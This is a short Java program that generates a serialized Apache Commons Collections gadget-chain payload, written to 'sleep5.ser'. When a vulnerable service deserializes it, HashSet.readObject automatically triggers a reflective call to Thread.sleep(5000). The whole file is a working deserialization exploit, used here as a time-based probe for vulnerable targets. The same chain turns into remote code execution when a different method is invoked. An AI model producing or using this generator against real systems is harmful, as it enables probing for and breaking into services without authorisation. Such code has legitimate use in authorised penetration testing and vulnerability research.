import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.io.*;
import java.util.*;

public class GenSleep {
    public static void main(String[] a) throws Exception {
        Transformer[] chain = new Transformer[]{
            new ConstantTransformer(Thread.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                new Object[]{"sleep", new Class[]{long.class}}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[]{5000L}})
        };
        ChainedTransformer chained = new ChainedTransformer(chain);
        Map innerMap = new HashMap();
        Map lazy = LazyMap.decorate(innerMap, chained);
        HashSet trigger = new HashSet();
        trigger.add(new TiedMapEntry(lazy, "go"));
        // 先序列化一次再反序列化触发 hashCode 的老套路不需要——HashSet readObject 时自动触发
        ObjectOutputStream o = new ObjectOutputStream(new FileOutputStream("sleep5.ser"));
        o.writeObject(trigger);
        o.close();
        System.out.println("sleep5.ser ok");
    }
}
